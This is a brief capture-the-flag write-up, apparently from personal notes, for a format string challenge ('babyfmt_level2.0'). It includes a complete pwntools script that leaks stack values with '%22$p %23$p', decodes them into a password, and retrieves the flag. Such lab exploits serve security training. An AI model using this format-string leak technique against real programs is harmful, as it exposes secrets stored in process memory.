# Format String Exploits 2.0

Running the provided executable file, we are tasked to leak the flag from the stack. I solve it using the same method as the previous one, but i think this is not the intended solution. Again, we need to find the offset, which happens to be in `%22$p` and `%23$p`. 

Final exploit:

```python
from pwn import *

elf = context.binary = ELF("/challenge/babyfmt_level2.0")

io = process()

print("===== STARTING EXPLOIT =====")

io.sendline("%22$p %23$p")

io.recvuntil(b'data!\n\n')

password = io.recvline(False).decode()

password = password.split(' ')
password = [p[2:] for p in password]
password = [[chr(int(p[i:i+2], 16)) for i in range(0, len(p), 2)] for p in password]
password = [''.join(reversed(password[i])) for i in range(len(password))]
password = ''.join(password)

io.sendline(password)

io.recvuntil(b'Password!\n')
print(f'Flag: {io.recvline(False)}')
```

Flag:

![[Format String Exploits/images/Level2.0.png]]